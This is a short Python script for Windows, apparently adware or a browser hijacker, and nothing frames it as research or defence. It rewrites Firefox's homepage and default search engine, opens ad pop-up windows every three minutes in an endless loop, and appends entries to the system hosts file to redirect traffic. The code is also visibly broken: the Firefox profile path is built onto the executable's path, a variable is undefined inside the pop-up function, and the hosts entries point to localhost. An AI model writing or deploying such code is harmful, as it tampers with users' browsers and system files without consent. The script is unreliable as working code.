import os, sys, time, win32com.client

# Step 1: Change Browser Home Page and Default Search Engine
def modify_browser_settings():
    browser_path = "C:\\Program Files\\Mozilla Firefox\\firefox.exe" 
    with open(browser_path + "\\profile\\prefs.js", 'a') as prefs_file:
        prefs_file.write("user_pref(\"browser.startup.homepage\", \"http://example.com\");\n")
        prefs_file.write("user_pref(\"browser.search.defaultenginename\", \"Example Search Engine\");\n")

# Step 2: Pop-up Generation
def generate_popups():
    def open_popup(url):
        shell = win32com.client.Dispatch('WScript.Shell')
        shell.Run(f'"{browser_path}" -new-window "{url}"')

    while True:
        urls = ["http://example.com", "http://another-ad-website.com"]
        for url in urls:
            open_popup(url)
        time.sleep(180)  # Open popup every 3 minutes

# Step 3: Traffic Redirection
def redirect_traffic():
    hosts_path = "C:\\Windows\\System32\\drivers\\etc\\hosts"
    with open(hosts_path, 'a') as hosts_file:
        hosts_file.write("127.0.0.1 www.example.com\n")
        hosts_file.write("127.0.0.1 search.example.com\n")

# Main function to execute all steps
def main():
    modify_browser_settings()
    redirect_traffic()
    generate_popups()

if __name__ == "__main__":
    main()
